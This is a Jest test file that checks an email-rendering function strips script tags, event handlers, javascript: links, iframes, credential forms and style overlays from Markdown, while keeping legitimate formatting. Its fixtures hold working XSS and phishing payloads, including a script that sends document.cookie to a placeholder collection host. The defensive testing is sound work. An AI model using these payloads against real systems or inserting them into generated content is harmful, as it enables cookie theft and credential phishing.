/**
 * markdownToEmailHtml — AI- and user-authored Markdown becomes the body of an
 * email we send from our own domain. Raw HTML inside that Markdown must never
 * reach the inbox as live markup (Matrx Alchemy T21).
 *
 * The break this guards: converting with `marked` alone (no sanitizer), which
 * passes `<script>`, `onerror=`, `javascript:` links, `<iframe>` and phishing
 * `<form>`s straight into the sent HTML.
 */
jest.mock("../client", () => ({ sendEmail: jest.fn(), emailTemplates: {} }));

import { markdownToEmailHtml } from "../exportService";

const ATTACKS: Array<[string, string, RegExp, string]> = [
  // [label, markdown, must NOT match, legitimate text that must survive]
  [
    "script tag",
    "Weekly summary\n\n<script>fetch('https://collect.example/steal?c='+document.cookie)</script>\n\nThanks, Dana",
    /<script/i,
    "Thanks, Dana",
  ],
  [
    "onerror attribute",
    'Chart below\n\n<img src="https://cdn.aimatrx.com/q3-chart.png" onerror="alert(document.domain)">',
    /onerror/i,
    "https://cdn.aimatrx.com/q3-chart.png",
  ],
  [
    "javascript: markdown link",
    "Review the [renewal quote](javascript:alert(document.cookie)) before Friday.",
    /javascript:/i,
    "renewal quote",
  ],
  [
    "javascript: raw anchor",
    'Open <a href="JaVaScRiPt:alert(1)">your invoice</a> today.',
    /javascript:/i,
    "your invoice",
  ],
  [
    "iframe embed",
    'Notes\n\n<iframe src="https://collect.example/frame"></iframe>\n\nEnd of notes',
    /<iframe/i,
    "End of notes",
  ],
  [
    "credential form",
    'Confirm your account\n\n<form action="https://collect.example/login"><input name="password" type="password"></form>',
    /<form|type="password"/i,
    "Confirm your account",
  ],
  [
    // A dropped <style> must not print its CSS as visible text either.
    "style block",
    "<style>.cta{position:fixed;inset:0}</style>\n\nRenewal is due on the 30th.",
    /<style|position:fixed/i,
    "Renewal is due on the 30th.",
  ],
];

describe("markdownToEmailHtml strips executable and embedding markup", () => {
  it.each(ATTACKS)("%s", (_label, markdown, forbidden, survivor) => {
    const html = markdownToEmailHtml(markdown);
    expect(html).not.toMatch(forbidden);
    expect(html).toContain(survivor);
  });
});

describe("markdownToEmailHtml keeps the formatting an email needs", () => {
  it.each([
    ["heading", "## Q3 pipeline review", "<h2>Q3 pipeline review</h2>"],
    ["link", "See [pricing](https://aimatrx.com/pricing).", '<a href="https://aimatrx.com/pricing">pricing</a>'],
    ["image", "![Q3 chart](https://cdn.aimatrx.com/q3.png)", '<img src="https://cdn.aimatrx.com/q3.png" alt="Q3 chart">'],
    ["list", "- Renew Acme\n- Call Brightline", "<li>Call Brightline</li>"],
    ["table", "| Plan | Seats |\n| --- | --- |\n| Pro | 12 |", "<td>12</td>"],
    ["code", "```ts\nconst seats = 12 * 2;\n```", '<code class="language-ts">const seats = 12 * 2;'],
    ["emphasis", "This is **urgent** and *final*.", "<strong>urgent</strong> and <em>final</em>"],
  ])("%s", (_label, markdown, expected) => {
    expect(markdownToEmailHtml(markdown)).toContain(expected);
  });
});
